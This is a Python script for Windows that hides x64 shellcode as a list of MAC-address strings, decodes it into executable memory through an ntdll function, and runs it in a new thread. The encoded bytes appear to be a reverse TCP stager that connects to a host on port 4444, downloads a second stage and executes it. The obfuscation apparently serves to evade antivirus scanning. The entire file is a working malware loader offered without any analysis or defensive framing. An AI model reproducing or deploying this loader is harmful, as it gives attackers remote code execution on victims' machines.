import ctypes

mac_list = [b'FC-48-83-E4-F0-E8', b'CC-00-00-00-41-51', b'41-50-52-48-31-D2', b'51-56-65-48-8B-52', b'60-48-8B-52-18-48', b'8B-52-20-48-0F-B7', b'4A-4A-48-8B-72-50', b'4D-31-C9-48-31-C0', b'AC-3C-61-7C-02-2C', b'20-41-C1-C9-0D-41', b'01-C1-E2-ED-52-41', b'51-48-8B-52-20-8B', b'42-3C-48-01-D0-66', b'81-78-18-0B-02-0F', b'85-72-00-00-00-8B', b'80-88-00-00-00-48', b'85-C0-74-67-48-01', b'D0-44-8B-40-20-49', b'01-D0-50-8B-48-18', b'E3-56-48-FF-C9-41', b'8B-34-88-48-01-D6', b'4D-31-C9-48-31-C0', b'41-C1-C9-0D-AC-41', b'01-C1-38-E0-75-F1', b'4C-03-4C-24-08-45', b'39-D1-75-D8-58-44', b'8B-40-24-49-01-D0', b'66-41-8B-0C-48-44', b'8B-40-1C-49-01-D0', b'41-8B-04-88-41-58', b'41-58-48-01-D0-5E', b'59-5A-41-58-41-59', b'41-5A-48-83-EC-20', b'41-52-FF-E0-58-41', b'59-5A-48-8B-12-E9', b'4B-FF-FF-FF-5D-49', b'BE-77-73-32-5F-33', b'32-00-00-41-56-49', b'89-E6-48-81-EC-A0', b'01-00-00-49-89-E5', b'49-BC-02-00-11-5C', b'C0-A8-01-80-41-54', b'49-89-E4-4C-89-F1', b'41-BA-4C-77-26-07', b'FF-D5-4C-89-EA-68', b'01-01-00-00-59-41', b'BA-29-80-6B-00-FF', b'D5-6A-0A-41-5E-50', b'50-4D-31-C9-4D-31', b'C0-48-FF-C0-48-89', b'C2-48-FF-C0-48-89', b'C1-41-BA-EA-0F-DF', b'E0-FF-D5-48-89-C7', b'6A-10-41-58-4C-89', b'E2-48-89-F9-41-BA', b'99-A5-74-61-FF-D5', b'85-C0-74-0A-49-FF', b'CE-75-E5-E8-93-00', b'00-00-48-83-EC-10', b'48-89-E2-4D-31-C9', b'6A-04-41-58-48-89', b'F9-41-BA-02-D9-C8', b'5F-FF-D5-83-F8-00', b'7E-55-48-83-C4-20', b'5E-89-F6-6A-40-41', b'59-68-00-10-00-00', b'41-58-48-89-F2-48', b'31-C9-41-BA-58-A4', b'53-E5-FF-D5-48-89', b'C3-49-89-C7-4D-31', b'C9-49-89-F0-48-89', b'DA-48-89-F9-41-BA', b'02-D9-C8-5F-FF-D5', b'83-F8-00-7D-28-58', b'41-57-59-68-00-40', b'00-00-41-58-6A-00', b'5A-41-BA-0B-2F-0F', b'30-FF-D5-57-59-41', b'BA-75-6E-4D-61-FF', b'D5-49-FF-CE-E9-3C', b'FF-FF-FF-48-01-C3', b'48-29-C6-48-85-F6', b'75-B4-41-FF-E7-58', b'6A-00-59-49-C7-C2', b'F0-B5-A2-56-FF-D5']

mac_list2 = []
for i in range(len(mac_list)):
    mac_list2.append(ctypes.string_at(mac_list[i]))

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(mac_list2) * 6, 0x3000, 0x40)
rwxpage = ptr

for i in range(len(mac_list2)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(mac_list2[i], mac_list2[i], ctypes.c_int64(rwxpage))
    rwxpage += 6

# ctypes.windll.kernel32.VirtualProtect(ctypes.c_int64(ptr), len(mac_list2) * 6, 0x40)

handler = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_int64(ptr), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handler, -1)
